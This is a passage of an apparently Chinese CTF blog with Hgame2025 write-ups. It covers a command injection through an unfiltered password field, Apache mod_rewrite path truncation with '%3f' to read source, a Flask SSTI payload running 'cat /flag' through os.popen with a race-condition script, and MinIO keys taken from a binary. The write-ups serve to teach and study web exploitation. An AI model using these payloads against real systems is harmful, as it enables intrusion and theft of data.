class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>               <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>             [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>               <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>             [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>              -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>             [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>              -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]<br>], dtype=torch.float32)<br><br>bias = torch.tensor([<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>          <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>], dtype=torch.float32)<br><br>out_features, in_features = weight.shape<br><br>mW = torch.mean(weight)<br><br>mB = torch.mean(bias)<br><br>c = (target_mean - mB) / (in_features * mW)<br><br>x = torch.full((<span class="hljs-number">1</span>, in_features), c, dtype=torch.float32)<br><br>x1 = torch.nn.functional.linear(x, weight, bias)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant input x:&quot;</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weight mean:&quot;</span>, mW.item(), <span class="hljs-string">&quot;  Bias mean:&quot;</span>, mB.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant c:&quot;</span>, c.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Linear layer output x1:&quot;</span>)<br><span class="hljs-built_in">print</span>(x1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mean of x1:&quot;</span>, torch.mean(x1).item())<br><br><span class="hljs-built_in">print</span>(torch.allclose(torch.mean(x1), torch.tensor(target_mean), rtol=<span class="hljs-number">1e-05</span>, atol=<span class="hljs-number">0.0001</span>))<br></code></pre></td></tr></table></figure><p>然而这里得出来的张量理论上应该是对的但输入后还是错的，未出现预期 flag。又改数据试了一会，感觉可能是题目所谓的时间错位加密，中间还有一道程序导致了 entity 中结果的偏移，所以最后决定以理论正确的输入为基础，0.01 的步长，正负 0.60 遍历一遍（每次变化对应 security 部分的平均值变化量为 0.0001）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> math<br><br>entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>))<br>entity.<span class="hljs-built_in">eval</span>()<br><br>weight1 = [[-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>,  <span class="hljs-number">0.2425</span>,  <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>,  <span class="hljs-number">0.1849</span>,<br>          <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>        [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>         -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>        [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>          <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>        [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>          <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>        [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>          <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>        [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>          <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>        [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>          <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>        [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>          <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>        [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>         -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>        [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>         -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]]<br>bias1 = [<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>         <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>]<br>torch_weight1 = torch.tensor(weight1, dtype=torch.float32)<br>torch_bias1   = torch.tensor(bias1, dtype=torch.float32)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">60</span>,<span class="hljs-number">60</span>):<br>    temp = <span class="hljs-number">378.3501922607422</span><br>    input_tensor = torch.tensor([[temp+i*<span class="hljs-number">0.01</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>]], dtype=torch.float32)<br><br>    x0 = torch.nn.functional.linear(input_tensor,torch_weight1,torch_bias1)<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_weight1))<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_bias1))<br>    <span class="hljs-built_in">print</span>(torch.mean(x0))<br>    <span class="hljs-built_in">print</span>(x0)<br>    f = torch.allclose(torch.mean(x0), torch.tensor(<span class="hljs-number">0.31415000000000004</span>), rtol=<span class="hljs-number">1.0000000000000001e-05</span>, atol=<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-built_in">print</span>(f)<br>    output = entity(input_tensor)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>最后终于跑出了结果，0.3141 -&gt; 0.3163 偏移了 0.0022</p><p><img src="/img/Hgame2025WP/CeSSbmVXHoGFgSxDTKycNAmDn4c.png"></p><h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>开虚拟机遇到一点问题，我的是 17.0，出题人应该是 17.5 及以上吧，浅改一下配置文件。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">找到攻击者的webshell连接密码<br>对攻击者进行简单溯源<br>排查攻击者目的<br></code></pre></td></tr></table></figure><p>按题目所给三步来即可得到 flag</p><p><img src="/img/Hgame2025WP/Ie7zbpP1Bo2l74xOOiEckwfznBf.png"></p><p><img src="/img/Hgame2025WP/AKJPbE7N6oJAlyxl640c3STQnNH.png"></p><p><img src="/img/Hgame2025WP/D85YbuUlTotiSmxr4vbc0YgqnZc.png"></p><p><img src="/img/Hgame2025WP/IhUrbfLVQoiedVxtZtAci61Mnpd.png"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h3><p>目录扫描，存在 <code>/flag</code>，直接访问为 <code>fake_flag</code></p><p>审计附件源码 <code>main.go</code>，主要实现了数据库连接测试、导入、查询这几个功能，发现存在函数 <code>sanitizeInput()</code> 和 <code>validateImportConfig()</code> 对各种输入严格过滤。</p><p>在注释的附近发现各个参数先拼接为字符串 command，再用 <code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command)</code> 执行命令，其中参数 <code>config.RemotePassword</code> 遗漏了对输入的过滤，从而可以实施命令注入。</p><p>点击导入数据，截包，在 <code>remote_password</code> 字段处加 <code>;</code> 来截断前面的命令，然后执行 <code>/writeflag</code></p><p><img src="/img/Hgame2025WP/RXldbCkq0o0DBDxX4sOcmusSnbf.png"></p><p>再访问 <code>/flag</code>，得到 flag</p><p><img src="/img/Hgame2025WP/H4bcbHBq2o9jYWxf5QhcovWmnIb.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 部分赛题复现</title>
    <link href="/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-部分赛题复现"><a href="#Hgame2025-部分赛题复现" class="headerlink" title="Hgame2025 部分赛题复现"></a>Hgame2025 部分赛题复现</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>这道题做出来了，但是有更简单的方法</p><p>游戏失败一次后即可得到一个“gift”，经过 base64+ 栅栏密码解密得到一个假的 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BofvbORQ6oUhCQxTMj9cPzopnTb.png"></p><p>flag 是在游戏通关后给出，那么就完全可能在 js 源码里找到 flag 相关的字符串。这里可以结合关键字“gift”进行搜索，发现了另一个不同的“gift”，同样的方式解密即可得到 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BNAgbjD1To2lnSxWGoecxrJinbh.png"></p><h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><p>用 dirsearch 目录扫描可以发现 robots.txt，其中有敏感信息 app.conf</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/MvOVbVXGJoePSpxLGPfcK7PBnsb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/VMBpb2SYgooQXoxMcPYcBhWgnFc.png"></p><p>从中可以拿到 app.py 的绝对路径，再利用 rewrite 来读⽂件，做题时未能联想到这一点，也不了解 CVE-2024-38475，只是用 <code>L1nk/</code> 开头的 <code>user-agent</code> 扫描爆破，所以未能找到任何有效信息。</p><p>研读一下参考资料：<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a> 可知，Apache 的 mod_rewrite 允许网站管理员透过 RewriteRule 语法轻松的将路径透过指定的规则改写：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RewriteRule</span> Pattern Substitution<span class="hljs-meta"> [flags]</span><br></code></pre></td></tr></table></figure><p>其中目标可以是一个档案系统路径或是一个网址，在改写路径时，mod_rewrite 会强制把结果视为网址处理(splitout_queryargs())，这导致了在 HTTP 请求中可以透过一个问号 <code>%3F</code> 去截断 RewriteRule 后面的路径或网址，从而引出了路径截断和误导 RewriteFlag 的设置两种攻击方式，本题涉及的应该是前者。</p><p>所以访问 <code>/admin/usr/local/apache2/app/app.py%3f</code> 可以截断后面的内容读取到 app.py 的源码</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JOdwb24EQoAMlExvZLbcSI3dnEh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(filename):<br>                f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                message = f.read()<br>                f.close()<br>                <span class="hljs-keyword">return</span> message<br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>        status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                status = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>        f.write(message) <br>        f.close()<br><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br>        <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>                show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>                <span class="hljs-keyword">return</span> render_template_string(show)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br>        <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>        app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>从源码中可以发现，留言板发送的信息会写入 <code>/tmp/message.txt</code> 中，存在 <code>/read</code> 路由也就是 <code>/app/read</code> 可以读取留言板发送的信息 <code>/tmp/message.txt</code> 并直接渲染在模版中返回，但前提是不能包含 <code>&#123;</code>，否则返回 <code>&#39;waf!!&#39;</code>。那么可以考虑通过 SSTI 实现 RCE，通过条件竞争来绕过 if 判断语句。</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FL8cbf8bsouurhxDsZecOlxjnXb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/P6WBbbBNdobRqsxSv5BcnszUndh.png"></p><p>先自己写个脚本试一下，对写入和读取过程进行条件竞争，在前一次读取文件无 <code>&#123;</code> 通过 if 判断后、后一次读取文件传入 show 渲染前，写入目标语句 <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code>，实现 RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_</span>():<br>    data=&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;<br>    res=requests.post(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/send&quot;</span>,data=data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_</span>():<br>    res=requests.get(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/read&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br>threads=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    thread1=threading.Thread(target=send_)<br>    thread2=threading.Thread(target=read_)<br>    <span class="hljs-comment">#这里当时遇到了一个问题，我写的是target=send_()那么实际为立即执行，两个函数为顺序执行，无法实现条件竞争</span><br>    <span class="hljs-comment">#正确的应该是target=send_，多线程完成请求</span><br>    threads.append(thread1)<br>    threads.append(thread2)<br>    thread1.start()<br>    thread2.start()<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.join()<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/ACwSbqbhdoseXcxAGdTc8fsOnyh.png"></p><p>官方 WP 所给脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <br><span class="hljs-keyword">import</span> threading <br>url = <span class="hljs-string">&#x27;http://node1.hgame.vidar.club:32737/&#x27;</span> <br>data = &#123; <br>    <span class="hljs-string">&quot;messgae&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <br>    &#125; <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_msg</span>(<span class="hljs-params">i</span>): <br>    data[<span class="hljs-string">&quot;message&quot;</span>] = <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>+<span class="hljs-built_in">str</span>(i) <br>    r = requests.post(url + <span class="hljs-string">&#x27;/app/send&#x27;</span>, data=data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_msg</span>(<span class="hljs-params">i</span>): <br>    r = requests.get(url + <span class="hljs-string">&#x27;/app/read&#x27;</span>) <br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&quot;read&quot;</span>, r.text) <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Latest&quot;</span> <span class="hljs-keyword">in</span> r.text: <br>        <span class="hljs-built_in">print</span>(r.text) <br>        exit() <br>threads = [] <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): <br>    thread = threading.Thread(target=write_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br>    thread = threading.Thread(target=read_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads: <br>    thread.join()<br></code></pre></td></tr></table></figure><h3 id="Level-25-双面人派对"><a href="#Level-25-双面人派对" class="headerlink" title="Level 25 双面人派对"></a>Level 25 双面人派对</h3><p>比赛的时候不熟悉 IDA 且未及时购买第二个提示，且末尾心态有些急，成功脱壳后没找到配置的内容，导致即便知道了后续的解题思路也无从下手 <a href="https://baimeow.cn/posts/ctf/d3go/">https://baimeow.cn/posts/ctf/d3go/</a>。重新检索了一下 IDA 相关用法，通过查找所有字符串找到了这段配置</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FMFHbGvd5oHP6QxfeMRcFt6Sn1g.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">minio: <br>    endpoint: <span class="hljs-string">&quot;127.0.0.1:9000&quot;</span> <br>    access_key: <span class="hljs-string">&quot;minio_admin&quot;</span> <br>    secret_key: <span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span> <br>    bucket: <span class="hljs-string">&quot;prodbucket&quot;</span> <br>    key: <span class="hljs-string">&quot;update&quot;</span><br></code></pre></td></tr></table></figure><p>使用 minio client 连接靶机（题目给的第一个地址）获取源码 src.zip</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HXSJb1TA3oJYHOxAERdcNhQDn7c.png"></p><p>main.go 源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;level25/fetch&quot;</span><br><br>    <span class="hljs-string">&quot;level25/conf&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>    <span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fetcher := &amp;fetch.MinioFetcher&#123;<br>        Bucket:    conf.MinioBucket,<br>        Key:       conf.MinioKey,<br>        Endpoint:  conf.MinioEndpoint,<br>        AccessKey: conf.MinioAccessKey,<br>        SecretKey: conf.MinioSecretKey,<br>    &#125;<br>    overseer.Run(overseer.Config&#123;<br>        Program: program,<br>        Fetcher: fetcher,<br>    &#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>    g := gin.Default()<br>    g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">true</span>))<br>    g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>从源码和<a 